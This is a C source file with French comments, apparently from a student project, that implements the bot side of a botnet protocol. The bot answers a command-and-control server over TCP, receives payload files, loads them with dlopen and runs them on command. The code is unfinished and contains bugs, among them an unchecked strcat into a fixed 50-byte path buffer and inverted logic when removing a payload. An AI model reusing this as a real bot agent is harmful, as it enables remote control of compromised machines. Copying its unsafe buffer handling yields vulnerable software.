#include "protocole.h"

/**
 * void send_status(info_bot_t info, int socket_tcp)
 * Fonction qui envoie le statut du bot au CC sur la socket TCP
 * param la socket de communication 
 
*/
void send_status(int socket_tcp)
{
    printf("[send_status]Start\n");
    char status;
    strcpy(&status,&(bot->etat));
    printf(" Le status que j'ai récup est : %c\n",status);
    if (write(socket_tcp, &status, sizeof(char)) < 0)
    {
        //traitement de l'erreur

    }
}
/**
 * void start_charge(char *file_name, charge_utile_t structure)
 * Fonction permettant d'exécuter une charge utile 
 * param structure de la charge utile 
 */
void start_charge(char *filename)
{
    printf("[start_charge]Start\n");
    strcpy(&(bot->etat),BOT_ACTIF);
    // chercher dans la liste le nom de la structure
    //TO DO : cas ou la charge n'est pas dans la liste => erreur
    charge_utile_t *structure = rechercheCU(filename, &list_CU);
    // TO DO : vérifier que la charge n'a pas déjà été start (qu'elle tourne pas déjà )
    printf("Je vais start le fichier : %s \n", structure->nom);
    init_f start;
    *(void **)(&start) = dlsym(structure->plugin, "start");
    char *result = dlerror();
    if (result)
    {
        perror("Cannot find start");
    }
    //dlclose(structure.nom);
    //Lancement de la fonction start dans un thread
    //TO DO : remplir la variable executed et resultat
    printf("Lancement du thread sur la fonction chargée\n");
    start(NULL);
    strcpy(&(bot->etat),BOT_INACTIF);
}

/**
 * void install_charge(char *file_name)
 * Fonction permettant d'installer une charge sur le BOT
 * param le nom de la charge utile
 */

void install_charge(char *file_name)
{
    printf("[install_charge]Start\n");
    // On met le statut du bot à 1 
    strcpy(&(bot->etat),BOT_ACTIF);
    //chercher dans la liste la structure portant ce nom
    charge_utile_t *charge = rechercheCU(file_name, &list_CU);
    if (charge == NULL)
    {
        printf("Did not find the charge installed\n");
        //Ajouter à la liste la charge_utile (installe le plugin)
        charge = (charge_utile_t *)malloc(sizeof(charge_utile_t));
        charge->nom = strdup(file_name);
        ajout_tete_cu(&list_CU, charge);
        printf("Successfully added the charge\n");
        //Chargement du fichier en tant que librairie dynamique
        //file_name = PATH du fichier (relatif ou absolu)
        char new_path[50];
        getcwd(new_path, sizeof(new_path));
        strcat(new_path, "/");
        strcat(new_path, file_name);
        charge->plugin = dlopen(new_path, RTLD_NOW);
        if (!charge->plugin)
        {
            printf("!!! %s\n", dlerror());
            return;
        }
        print_listeCU(list_CU);
        //On met le statut du bot à 0 
        strcpy(&(bot->etat),BOT_INACTIF);
    }
    else
    {
        //On ne fait rien, la charge est déja installée
        printf("Charge already installed ! \n");
    }
}

void rm_charge(char *filename)
{
    printf("[rm_charge]Start\n");
    charge_utile_t *structure = rechercheCU(filename, &list_CU);
    if (structure == NULL)
    {
        printf("je vais supprimer le fichier : %s\n", filename);
        // rm de la liste
        supp_elm_liste_CU(&list_CU, filename);
    }
    else
    {
        //On ne fait rien, la charge a déjà été supprimée
        printf("Charge already deleted ! \n");
    }
    printf("La charge utile %s a bien été supprimée ! \n", filename);
    // TO DO : Répondre au cc
    
}

charge_utile_t *getChargeFromMessage(int socket)
{
    printf("[getChargeFromMessage]Start\n");
    char filename[TAILLE_FILENAME];
    if (receiveTCP(socket, filename, TAILLE_FILENAME) < 0)
    {
        printf("Erreur dans la réception du nom de la charge utile\n");
        return NULL;
    }
    printf("Le nom du fichier est : %s\n", filename);
    charge_utile_t *charge = rechercheCU(filename, &list_CU);
    if (charge != NULL)
    {
        print_CU_structure(charge);
    }
    else
    {
        printf("La charge utile n'existe pas");
    }
    return charge;
}

/** void receive_cmd_TCP(void *arg)
 *  Fonction qui reçoit une numéro de commande et en fct de la commande il interprète 
 */
void receive_cmd_TCP(void *arg)
{
    printf("[receive_cmd_TCP]Start\n");
    char cmd_recue;
    int socket_tcp = *((int *)arg);
    charge_utile_t *charge;

    if (receiveTCP(socket_tcp, &cmd_recue, sizeof(cmd_recue)) != sizeof(cmd_recue))
    {
        printf("Erreur dans la récéption de la commande TCP\n");
    };
    printf("[receive_cmd_TCP]La cmd que j'ai lu de mon client TCP est : %c\n", cmd_recue);
    switch (cmd_recue)
    {
    case '1': // STATUT
        send_status(socket_tcp);
        break;

    case '2': //INSTALL
        recvFile(&socket_tcp);
        break;
    case '3': //START
        charge = getChargeFromMessage(socket_tcp);
        if (charge == NULL)
        {
            perror("Can't start charge utile\n");
            //TODO : Renvoyer dans la socket le fait que la charge utile est introuvable
            //renvoieErreur();
        }
        else
        {
            print_CU_structure(charge);
            start_charge(charge->nom);
        }
        break;
    case '4': //RM

        charge = getChargeFromMessage(socket_tcp);
        if (charge == NULL)
        {
            perror("Can't rm charge utile\n");
            //TODO : Renvoyer dans la socket le fait que la charge utile est introuvable
            //renvoieErreur();
        }
        else
        {
            print_CU_structure(charge);
            rm_charge(charge->nom);
        }
        break;
    case '5': //QUIT
        break;
    }
}

/* void renvoieErreur(){

} */